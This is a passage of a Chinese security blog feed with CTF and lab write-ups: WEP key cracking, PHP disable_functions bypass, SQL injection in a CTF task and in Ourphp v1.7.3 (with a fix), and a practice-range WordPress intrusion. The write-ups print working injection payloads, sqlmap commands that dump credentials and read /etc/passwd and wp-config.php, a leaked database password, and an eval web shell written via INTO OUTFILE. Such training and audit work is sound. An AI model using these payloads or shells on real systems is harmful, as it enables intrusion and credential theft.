class="hljs-symbol">\x</span>A7<span class="hljs-symbol">\x</span>8DCTF<span class="hljs-symbol">\w</span>ifi<span class="hljs-symbol">\w</span>ww.ivs<br>  Preferred POSIX equivalent is: /cygdrive/e/CTF/<span class="hljs-symbol">\x</span>E6<span class="hljs-symbol">\x</span>AF<span class="hljs-symbol">\x</span>94<span class="hljs-symbol">\x</span>E8<span class="hljs-symbol">\x</span>B5<span class="hljs-symbol">\x</span>9B/<span class="hljs-symbol">\x</span>E7<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>AB<span class="hljs-symbol">\x</span>E7<span class="hljs-symbol">\x</span>A7<span class="hljs-symbol">\x</span>8DCTF/wifi/www.ivs<br>  CYGWIN environment variable option &quot;nodosfilewarning&quot; turns off this warning.<br>  Consult the user&#x27;s guide for more details about POSIX paths:<br>    http://cygwin.com/cygwin-ug-net/using.html#using-pathnames<br>Read 36977 packets.<br><br>   #  BSSID              ESSID                     Encryption<br><br>   1  78:EB:14:0D:2B:10  ceshi                     WEP (36960 IVs)<br>   2  1C:FA:68:D3:1B:2A  FMCN                      Unknown<br>   3  00:87:36:1F:CB:C3  360WiFi-CBC3              Unknown<br>   .......<br><br>Index number of target network ?<br></code></pre></td></tr></table></figure><p>选择1并回车<br>然后提示</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">KEY</span> <span class="hljs-selector-tag">FOUND</span>! <span class="hljs-selector-attr">[ 31:32:33:34:35 ]</span> (<span class="hljs-attribute">ASCII</span>: <span class="hljs-number">12345</span> )<br></code></pre></td></tr></table></figure><p>因此压缩包密码是12345.<br>打开压缩包使用wireshark打开。导出其中的文件。<br>其中有个文件内容为</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">username=%E7%AD%94%E6%A1%88&amp;password=key%7Bbalabala%7D&amp;<span class="hljs-keyword">image</span>.x=<span class="hljs-number">51</span>&amp;<span class="hljs-keyword">image</span>.y=<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><p>password即为flag。</p><h2 id="0x03-Wireshark导出数据包内文件的方法"><a href="#0x03-Wireshark导出数据包内文件的方法" class="headerlink" title="0x03 Wireshark导出数据包内文件的方法"></a>0x03 Wireshark导出数据包内文件的方法</h2><p>打开文件后，左上角文件-导出对象-HTTP<br>选择文件保存即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>国赛的两个Web题</title>
    <link href="/2017/09/10/%E5%9B%BD%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AAWeb%E9%A2%98/"/>
    <url>/2017/09/10/%E5%9B%BD%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AAWeb%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>在全国大学生信息安全竞赛(线上赛)上划了波水，对我来说题目挺难的，好多姿势都没见过。</p><a id="more"></a><h2 id="0x00-两个最简单的Web的题解"><a href="#0x00-两个最简单的Web的题解" class="headerlink" title="0x00 两个最简单的Web的题解"></a>0x00 两个最简单的Web的题解</h2><h3 id="Web-PHP-execise"><a href="#Web-PHP-execise" class="headerlink" title="Web-PHP execise"></a>Web-PHP execise</h3><p>这个题目考察了PHP的几个简单的语法<br>首先在题目中执行phpinfo()函数<br><img src="https://image.mengsec.com/Web-PHPexcise-1.png" alt="image"><br>在其中的找到被禁用的函数</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">disable_functions<br>assert,<span class="hljs-keyword">system</span>,passthru,<span class="hljs-keyword">exec</span>,pcntl_exec,shell_exec,<span class="hljs-keyword">popen</span>,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,<span class="hljs-keyword">fopen</span>,file_get_contents,<span class="hljs-keyword">fread</span>,file_get_contents,<span class="hljs-keyword">file</span>,readfile,opendir,readdir,closedir,rewinddir,<br></code></pre></td></tr></table></figure><p>然后通过getcwd()函数获取服务器当前目录路径</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title">getcwd</span>()</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/Web-PHPexcise-2.png" alt="image"><br>从而获取路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www/html<br></code></pre></td></tr></table></figure><p>然后获取当前目录下的所有文件的文件名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs p&#39;h&#39;p">$dir&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;;print_r(scandir($dir))<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/Web-PHPexcise-3.png" alt="image"><br>判断flag在flag_62cfc2dc115277d0c04ed0f74e48e3e9.php这个文件中，但是PHP几乎所有对文件操作的函数都被禁用了。在这时想到了以前表哥们给我们出题的时候，有的Web题的源码直接显示在网页上了，利用的show_source()函数.于是乎：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">include</span><span class="hljs-string">&quot;flag_62cfc2dc115277d0c04ed0f74e48e3e9.php&quot;</span>;<span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-string">&quot;flag_62cfc2dc115277d0c04ed0f74e48e3e9.php&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>从而获取flag</p><p><img src="https://image.mengsec.com/Web-PHPexcise-4.png" alt="image"></p><h3 id="Web-wanna-to-see-your-hat"><a href="#Web-wanna-to-see-your-hat" class="headerlink" title="Web-wanna to see your hat?"></a>Web-wanna to see your hat?</h3><p>这题有毒，不拿到flag就给你10个绿帽子。。(╯‵□′)╯︵┻━┻</p><p>主要考察的代码审计和SQL注入。首先有一个SVN源码泄露漏洞，利用工具将网站所有的源码下载下来，进行审计。关键代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_POST</span>=d_addslashes(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$_GET</span>=d_addslashes(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$array</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!is_array(<span class="hljs-variable">$value</span>))&#123;<br>            !get_magic_quotes_gpc() &amp;&amp; <span class="hljs-variable">$value</span>=addslashes(<span class="hljs-variable">$value</span>);<br>            waf(<span class="hljs-variable">$value</span>);<br>            <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>]=<span class="hljs-variable">$value</span>;<br>        &#125;   <br>    &#125;   <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-variable">$Filt</span> = <span class="hljs-string">&quot;\bUNION.+SELECT\b|SELECT.+?FROM&quot;</span>;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$Filt</span>.<span class="hljs-string">&quot;/is&quot;</span>,<span class="hljs-variable">$value</span>)==<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;found a hacker&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$value</span> = str_replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$value</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>]))&#123;<br>  <span class="hljs-variable">$name</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, trim(waf(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>])));<br>  <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$name</span>) &gt; <span class="hljs-number">11</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;name too long&#x27;)&lt;/script&gt;&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from t_info where username = &#x27;<span class="hljs-subst">$name</span>&#x27; or nickname = &#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>])&#123;<br>      <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;hat&#x27;</span>] = <span class="hljs-string">&#x27;black&#x27;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;good job&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;hat&#x27;</span>] = <span class="hljs-string">&#x27;green&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>最终目的是令$_SESSION[‘hat’] = ‘black’;这也就意味着在执行SQL语句时，可以返回数据。但是，在register.php的插入语句为</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$sql = <span class="hljs-string">&quot;insert into t_user (username,nickname,password) values(&#x27;&quot;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.$_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>].<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.md5($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]).<span class="hljs-string">&quot;&#x27;)&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>它注册时写入数据的表与登陆时查询的表不是一个，这也把我的思路带偏了，我一开始认为，在register.php里面构造语句在t_info表中插入数据。但根据查到的资料显示，SQL只允许一个插入语句对一个表操作。没辙了。。去请教表哥们。<br>关键点在login.php，即登录界面。<br>关键语句</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$name = str<span class="hljs-constructor">_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-params">trim</span>(<span class="hljs-params">waf</span>($<span class="hljs-params">_POST</span>[<span class="hljs-string">&quot;name&quot;</span>])</span>));<br></code></pre></td></tr></table></figure><p>在POST传入name时，如果传进的字符串中有“’”单引号，则会被加上反斜杠进行转义，然后在waf里面，若有空格则会被去掉。然后“&#39;”中的单引号被去掉，成为了“\”,若这个反斜杠在结尾，则会把 </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> t_info <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span> <span class="hljs-keyword">or</span> nickname = <span class="hljs-string">&#x27;$name&#x27;</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>第一个name的第二个单引号转义，导致</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$name</span>&#x27; or nickname =</span><br></code></pre></td></tr></table></figure><p>成为了字符串。因此令</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">name</span>==(<span class="hljs-number">0</span>)=<span class="hljs-number">1</span><span class="hljs-comment">#&#x27;</span><br></code></pre></td></tr></table></figure><p>最终执行的SQL语句为</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> t_info <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;=(0)=1#\&#x27; or nickname = &#x27;</span>=(<span class="hljs-number">0</span>)=<span class="hljs-number">1</span>#\<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure><p>该语句为真，因此返回数据，使得$_SESSION[‘hat’] = ‘black’;从而返回flag<br><img src="https://image.mengsec.com/Web-green-1.png" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
      <tag>全国大学生信息安全竞赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ourphp v1.7.3 SQL Injection</title>
    <link href="/2017/09/10/ourphp-v1-7-3-SQL-Injection/"/>
    <url>/2017/09/10/ourphp-v1-7-3-SQL-Injection/</url>
    
    <content type="html"><![CDATA[<p>跟着表哥学习学习(ง •_•)ง</p><a id="more"></a><h2 id="0x00-漏洞产生原理"><a href="#0x00-漏洞产生原理" class="headerlink" title="0x00 漏洞产生原理"></a>0x00 漏洞产生原理</h2><p>首先放上表哥给的Payload</p><pre><code>)union selselectect 1,user(),3,4,5-- p0&#39;</code></pre><p>通过Payload往上找漏洞点</p><pre><code>http://www.op.com/client/user/?cn-login.html</code></pre><p>首先根据登录页面的url，找到在templates/user目录下的cn_login.html,然后在会员登录表单中，找到调用的php文件的路径，在第31行</p><pre><code>action=&quot;[.$webpath.]client/user/ourphp_play.class.php?ourphp_cms=login&quot;</code></pre><p>然后往上找到client/user目录中的ourphp_play.class.php，在第184行，将post传入的参数带入了数据库查询语句</p><pre><code>$ourphp_rs = $db -&gt; select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39; || `OP_Usertel` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);</code></pre><p>在其中使用了”dowith_sql()”函数将参数进行了过滤，很明显是自定义函数，定位一下，在function目录下的ourphp_function.php文件中的第10行.</p><p>审计一下所谓的防注入函数，可以看到开发人员在此犯了一个严重的错误。首先使用addslashes()函数将一些敏感字符，比如单引号进行了转义，但是，在后续处理中又将单引号使用str_ireplace()函数替换掉了，这就相当于传入的单引号变成了反斜杠”&quot;。</p><pre><code>第11行$ourphpstr = addslashes($ourphpstr);第35行$ourphpstr = str_ireplace(&quot;&#39;&quot;,&quot;&quot;,$ourphpstr);</code></pre><p>这个漏洞和前段时间的国赛中的一个Web题一样，题目是</p><pre><code>wanna to see your hat?</code></pre><p>解题过程：</p><pre><code>http://iwenhu.cn/2017/07/12/%E5%9B%BD%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AAWeb%E9%A2%98.html</code></pre><p>而且在这个防注入函数中，开发者采用的一大串的str_ireplace函数来替换黑名单中的字符，有很大一部分是没有意义的，简单的双写一下就可以绕过.</p><pre><code>比如 cocountunt,在里面一替换，就成了count</code></pre><p>在这时，payload经过函数处理，变成了</p><pre><code>)union select 1,user(),3,4,5-- p0\</code></pre><p>这时带入了SQL查询语句中</p><pre><code>select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;)union select 1,user(),3,4,5-- p0\&#39; || `OP_Usertel` = &#39;)union select 1,user(),3,4,5-- p0\&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);</code></pre><p>在这个语句中，因为最后面的那个单引号被处理成了反斜杠,然后反斜杠将语句末尾的单引号转义，使得</p><pre><code>(`OP_Useremail` = &#39;)union select 1,user(),3,4,5-- p0\&#39; || `OP_Usertel` = &#39;)</code></pre><p>通过Mysql监控工具可以找到执行的SQL语句</p><pre><code>select `id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username` from `ourphp_user` WHERE (`OP_Useremail` = &#39;)union select 1,user(),3,4,5-- p0\&#39; || `OP_Usertel` = &#39;)union select 1,user(),3,4,5-- p0\&#39;) and `OP_Userpass` = &#39;d9b1d7db4cd6e709&#39;</code></pre><p>在这里OP_Useremail为</p><pre><code>)union select 1,user(),3,4,5-- p0\&#39; || `OP_Usertel` =</code></pre><p>语句中的union select执行了。后面的密码处理的语句都被注释符”– “注释掉了。这样就构成了一个SQL注入漏洞。</p><h2 id="0x01-修补方案"><a href="#0x01-修补方案" class="headerlink" title="0x01 修补方案"></a>0x01 修补方案</h2><p>该漏洞最主要的原因是waf的处理逻辑有问题，可以把</p><pre><code>$ourphpstr = str_ireplace(&quot;&#39;&quot;,&quot;&quot;,$ourphpstr);</code></pre><p>放到</p><pre><code>$ourphpstr = addslashes($ourphpstr);</code></pre><p>的前面，先处理单引号，再转义敏感字符。这样的话漏洞就被处理掉了。</p><p>对于双写绕过呢，可以用递归的方式检查参数，在牺牲小部分性能的情况下来获取服务器的安全，就是检查，过滤，检查，过滤，直到检查通过为止。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次靶场渗透</title>
    <link href="/2017/09/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <url>/2017/09/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p>找了个靶场练练手，在此记一下。</p><a id="more"></a><h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>直接访问，是wordpress博客</p><pre><code>Apache/2.4.10 (Debian)</code></pre><p>使用御剑扫一下网站</p><pre><code>http://218.2.197.234:2040/phpmyadmin/db_create.phphttp://218.2.197.234:2040/phpmyadmin/index.phphttp://218.2.197.234:2040/phpmyadmin/tbl_create.phphttp://218.2.197.234:2040/wp-admin/admin-ajax.phphttp://218.2.197.234:2040/wp-admin/install.phphttp://218.2.197.234:2040/wp-login.phphttp://218.2.197.234:2040/readme.html</code></pre><p>看样子有phpmyadmin，既然是wordpress博客，那么就用WPScan扫一下，找到两个有问题的插件</p><pre><code>root@kali:~# wpscan -u &quot;http://218.2.197.234:2040/&quot; --enumerate p[+] We found 2 plugins:[+] Name: akismet |  Latest version: 3.3.4  |  Location: http://218.2.197.234:2040/wp-content/plugins/akismet/[!] We could not determine a version so all vulnerabilities are printed out[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)    Reference: https://wpvulndb.com/vulnerabilities/8215    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html[i] Fixed in: 3.1.5[+] Name: wp-symposium - v15.1 |  Location: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/ |  Readme: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/readme.txt[!] The version is out of date, the latest version is 15.8.1</code></pre><p>而且知道了wordpress的版本为v4.3.1<br>主题是</p><pre><code>[+] Name: twentyfifteen - v1.3 |  Location: http://218.2.197.234:2040/wp-content/themes/twentyfifteen/ |  Readme: http://218.2.197.234:2040/wp-content/themes/twentyfifteen/readme.txt[!] The version is out of date, the latest version is 1.8 |  Style URL: http://218.2.197.234:2040/wp-content/themes/twentyfifteen/style.css |  Theme Name: Twenty Fifteen |  Theme URI: https://wordpress.org/themes/twentyfifteen/ |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple,... |  Author: the WordPress team |  Author URI: https://wordpress.org/    </code></pre><p>有个用户<br>​<br>​    [+] Enumerating usernames …<br>​    [+] Identified the following 1 user/s:<br>​        +—-+———–+———–+<br>​        | Id | Login     | Name      |<br>​        +—-+———–+———–+<br>​        | 1  | localhost | localhost |<br>​        +—-+———–+———–+</p><p>已经知道了只有这一个Web服务，就没必要用Nmap扫描了。</p><p>统计一下信息<br>​<br>​    Web容器 Apache/2.4.10 (Debian)<br>​    phpmyadmin<br>​<br>​    wordpress<br>​    有两个脆弱的插件 Akismet 和 wp-symposium - v15.1<br>​    主题是 twentyfifteen - v1.3<br>​    一个用户 localhost</p><p>去网上寻找wp-symposium v15.1的漏洞</p><p>找到三个，全部都是SQL注入</p><pre><code>CVE-2015-3325WordPress Plugin WP Symposium 15.1 - &#39;&amp;show=&#39; SQL Injectionhttps://www.exploit-db.com/exploits/37080/CVE-2015-6522WordPress Plugin WP Symposium 15.1 - &#39;get_album_item.php&#39; SQL Injectionhttps://www.exploit-db.com/exploits/37824/WordPress Plugin WP Symposium 15.1 - Blind SQL Injectionhttps://www.exploit-db.com/exploits/37822/</code></pre><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>经过测试只有第三个可以注入成功，CVE-2015-6522在这个网站上没法查询别的数据，看源代码是没有过滤的，但是只能返回database(),version()等函数的值。</p><p>利用第三个盲注漏洞，使用SQLmap</p><p>将访问的请求包保存到txt文件里，使用-r参数</p><p>跑数据库</p><pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; --dbs</code></pre><p>回显<br>​<br>​    available databases [4]:<br>​    [<em>] information_schema<br>​    [</em>] mysql<br>​    [<em>] performance_schema<br>​    [</em>] wordpress</p><p>跑wordpress的表</p><pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; -D &quot;wordpress&quot; --tables</code></pre><p>回显</p><pre><code>Database: wordpress             [36 tables]                     +------------------------------+| wp_commentmeta               || wp_comments                  || wp_links                     || wp_options                   || wp_postmeta                  || wp_posts                     || wp_symposium_audit           || wp_symposium_cats            || wp_symposium_chat2           || wp_symposium_chat2_typing    || wp_symposium_chat2_users     || wp_symposium_comments        || wp_symposium_events          || wp_symposium_events_bookings || wp_symposium_extended        || wp_symposium_following       || wp_symposium_friends         || wp_symposium_gallery         || wp_symposium_gallery_items   || wp_symposium_group_members   || wp_symposium_groups          || wp_symposium_likes           || wp_symposium_lounge          || wp_symposium_mail            || wp_symposium_news            || wp_symposium_styles          || wp_symposium_subs            || wp_symposium_topics          || wp_symposium_topics_images   || wp_symposium_topics_scores   || wp_symposium_usermeta        || wp_term_relationships        || wp_term_taxonomy             || wp_terms                     || wp_usermeta                  || wp_users                     |+------------------------------+</code></pre><p>看名称，用户名和密码应该在wp_users中，直接跑数据</p><pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; -D &quot;wordpress&quot; -T &quot;wp_users&quot; --dump</code></pre><p>回显</p><pre><code>Database: wordpressTable: wp_users[1 entry]+----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+| ID | user_url | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |+----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+| 1  | &lt;blank&gt;  | $P$BoRvgt/kaEDWqyiq0a3U8QjUQAO6gQ0 | localhost  | test@test.com | 0           | localhost    | localhost     | 2015-10-11 10:10:07 | &lt;blank&gt;             |+----+----------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+</code></pre><p>很明显，密码是被加密过的，根据网上资料可知强度很高，很难破解。</p><p>尝试从phpmyadmin入手，首先用SQLmap将数据库的用户名和密码跑出来</p><pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; --current-user --password</code></pre><p>回显</p><pre><code>database management system users password hashes:[*] debian-sys-maint [1]:    password hash: *AA59232D46C9C0751BA3069045A0B90F3C6431C4[*] root [1]:    password hash: *74ACCF7FB15CDBAEE88B9E7F7B58352D3308CFF2[*] wordpress [1]:    password hash: *A22BD9F95BF505E792C556FC1EF9FCFA6B6B5D9B</code></pre><p>很遗憾，同样是加密过的，很难破解。</p><p>再换个方向，直接用sqlmap写Shell，但总是报错，看样子权限不够。没思路了。。</p><p>于是请教了下表哥，读文件+扫目录。<br>尝试用sqlmap读了下/etc/passwd，可以读。看样子读文件是有权限的，但是由于是盲注，读数据很慢。渗透网站的话可以读一下网站的配置文件，但是不知道绝对路径。可以猜：</p><pre><code>Apache默认的网站路径为 /var/www/html/wordpress在网站根目录存在wp-config.php的配置文件</code></pre><p>尝试直接用sqlmap读取这个文件</p><pre><code>sqlmap -r &quot;C:\Users\10904\Desktop\2040.txt&quot; --file-read &quot;/var/www/html/wp-config.php&quot; -p &quot;topic_id&quot;</code></pre><p>运气不错，直接下载到本地了</p><pre><code> &lt;?phpdefine(&#39;DB_NAME&#39;, &#39;wordpress&#39;);define(&#39;DB_USER&#39;, &#39;wordpress&#39;);define(&#39;DB_PASSWORD&#39;, &#39;CxfKVWX5@xr5cqzb8&#39;);define(&#39;DB_HOST&#39;, &#39;localhost&#39;);if ( !defined(&#39;ABSPATH&#39;) )    define(&#39;ABSPATH&#39;, dirname(__FILE__) . &#39;/&#39;);require_once(ABSPATH . &#39;wp-settings.php&#39;);</code></pre><p>在这个文件里，我们可以获得wordpress用户的用户名和密码<br>​<br>​    Username: wordpress<br>​    Password: CxfKVWX5@xr5cqzb8</p><p>然后进入phpmyadmin,直接登录</p><pre><code>http://218.2.197.234:2040/phpmyadmin</code></pre><p>在其中的SQL语句执行窗口执行SQL语句，直接往网站根目录写文件也是没有权限的，会报错</p><pre><code>select &#39;&lt;?php @eval($_POST[2333])?&gt;&#39;INTO OUTFILE &#39;/var/www/html/123456789.php&#39;;#1 - Can&#39;t create/write to file &#39;/var/www/html/123456789.php&#39; (Errcode: 13)</code></pre><p>尝试更换写文件的路径，首先用DirBuster扫了下目录，有images和upload两个文件夹，这种目录的权限一般会低一些。</p><p><img src="https://image.mengsec.com/test-8-22-1.png"></p><p>尝试</p><pre><code>select &#39;&lt;?php @eval($_POST[2333])?&gt;&#39;INTO OUTFILE &#39;/var/www/html/upload/123456789.php&#39;;select &#39;&lt;?php @eval($_POST[2333])?&gt;&#39;INTO OUTFILE &#39;/var/www/html/images/123456789.php&#39;;</code></pre><p>成功在images中写入shell。</p><p><img src="https://image.mengsec.com/test-8-22-2.png"></p><p>用菜刀连接，在网站目录下获得flag</p><pre><code>flag&#123;Hi_Web_fLaG_Is_HEre&#125;   </code></pre><p>PS: 如果已知flag在网站根目录的话，可以直接用sqlmap读取文件，不用拿Shell</p><h2 id="0x02-收获-amp-感想"><a href="#0x02-收获-amp-感想" class="headerlink" title="0x02 收获&amp;感想"></a>0x02 收获&amp;感想</h2><ol><li>渗透测试中信息收集真的很重要，一旦忽略了什么，在测试过程中就更容易卡住。</li><li>在测试中要打开自己的思路，要思考全面。比如写文件不行的话，可以读文件嘛，说白了，还是经验不足，练得少。</li><li>つ﹏⊂强行凑三条(逃</li></ol>]]></content>
    
    
    
